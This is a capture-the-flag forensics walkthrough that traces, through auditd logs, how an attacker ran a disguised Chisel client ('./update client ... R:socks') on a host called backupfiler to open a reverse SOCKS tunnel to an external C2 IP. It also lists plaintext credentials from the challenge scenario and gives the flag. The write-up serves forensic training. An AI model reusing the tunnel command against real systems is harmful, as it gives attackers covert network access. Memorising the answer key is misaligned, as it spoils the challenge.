# Grhelp - Connect back - Walkthrough

## Challenge

**Category:** Forensics  
**Points:** 338  
**Description:** "L'attaquant a réussi à exécuter une commande sur un serveur pour que celui-ci se connecte à son C2. Quelle est la commande et le nom de la machine ?"  
**File:** `grhelp-logs-connect.tar.gz`

## Analysis

The archive contains auditd logs from 2025-05-13 covering the same `jurisdefense.intra` infrastructure. The logs span multiple hosts: `backupfiler`, `cups`, `front`, `proxy`, `wazuh`, `ws22`, and `ws24`.

### Identifying Suspicious Tooling

A broad enumeration of all unique `a0` (executable) values in `EXECVE` events reveals several unusual entries:

- `tmux` - interactive terminal multiplexer, unusual in a production environment
- `sshpass` - automated SSH password passing, used for lateral movement
- `./update` - local binary with suspicious relative-path invocation
- `sshpass` + `ssh` sequences targeting various internal IPs, indicating reconnaissance

### The Connect-Back Command

Filtering for the `./update` binary on `backupfiler`:

```
node=backupfiler.jurisdefense.intra type=EXECVE msg=audit(1747142884.895:330846):
  argc=4 a0="./update" a1="client" a2="15.188.57.187:9999" a3="R:socks"
exe="/home/goadmin/update"
CWD: /home/goadmin
auid="goadmin" UID="goadmin"
```

Decoded PROCTITLE: `./update client 15.188.57.187:9999 R:socks`

This is [Chisel](https://github.com/jpillora/chisel), a fast TCP/UDP tunnel over HTTP disguised as a system utility. The invocation:

- **`client`** - run in client mode, connecting to the attacker's server
- **`15.188.57.187:9999`** - attacker's C2 IP and port
- **`R:socks`** - reverse SOCKS proxy: the server side gets a SOCKS5 proxy entry point that routes through the compromised backupfiler

### Delivery Chain

**13:12:45 UTC** - `goadmin` authenticates via SSH from `192.168.50.17` (an already-compromised internal workstation):
```
op=PAM:authentication acct="goadmin" hostname=192.168.50.17 addr=192.168.50.17 terminal=ssh res=success
```

**13:25:09 UTC** - SFTP subsystem launched (file upload incoming):
```
EXECVE: bash -c /usr/lib/openssh/sftp-server
```
The attacker used SFTP to upload the `update` (Chisel) binary to `/home/goadmin/`.

**13:25:42 UTC** - Attacker starts a new `tmux` session:
```
tmux  (CWD: /home/goadmin)
```

**13:28:04 UTC** - Chisel connect-back executed:
```
./update client 15.188.57.187:9999 R:socks
```

### Timeline

| Timestamp (UTC) | Event |
|---|---|
| ~13:12:45 | `goadmin` SSH login from `192.168.50.17` |
| 13:25:09 | SFTP session - Chisel binary uploaded to `/home/goadmin/update` |
| 13:25:42 | Attacker starts `tmux` session for persistence |
| **13:28:04** | **`./update client 15.188.57.187:9999 R:socks` - Chisel C2 connect-back** |

### Context: Prior Reconnaissance

Before the connect-back, the attacker had been conducting active lateral movement on the network using `sshpass` + `ssh` from `ws22` and `ws24`, targeting:
- `sophie.martin@192.168.10.x` (password: `Sm2025@Legal`)
- `michel.machin@192.168.10.x` (password: `machinMACHIN2025`)

The same C2 IP (`15.188.57.187`) was later used on 2025-05-14 to receive the `scp` exfiltration of `/tmp/smb_share.tar.gz` (see Grhelp - Exfiltration challenge).

## Solution

- **Command:** `./update client 15.188.57.187:9999 R:socks`
- **Machine hostname:** `backupfiler`

The tool `update` is Chisel, a SOCKS-over-HTTP reverse tunnel. The attacker uploaded it via SFTP and executed it from `/home/goadmin` on `backupfiler.jurisdefense.intra`.

### Key Steps

1. Enumerate all `a0` executable values across all nodes in the connect logs
2. Identify `./update` as anomalous - a non-system binary run with relative path
3. Decode the EXECVE arguments: `client 15.188.57.187:9999 R:socks` matches Chisel syntax
4. Confirm machine hostname: `backupfiler.jurisdefense.intra`

## Exploit / Script

```bash
# Find all unique executables across connect logs
grep -r "EXECVE" logs/ | grep -oE 'a0="[^"]*"' | sort -u

# Find the ./update execution
grep -r "EXECVE" logs/ | grep 'a0="\./update"'

# Decode Unix timestamp
date -d @1747142884 --utc
# Output: Tue May 13 13:28:04 UTC 2025
```

## Flag

`FCSC{backupfiler-./update client 15.188.57.187:9999 R:socks}`
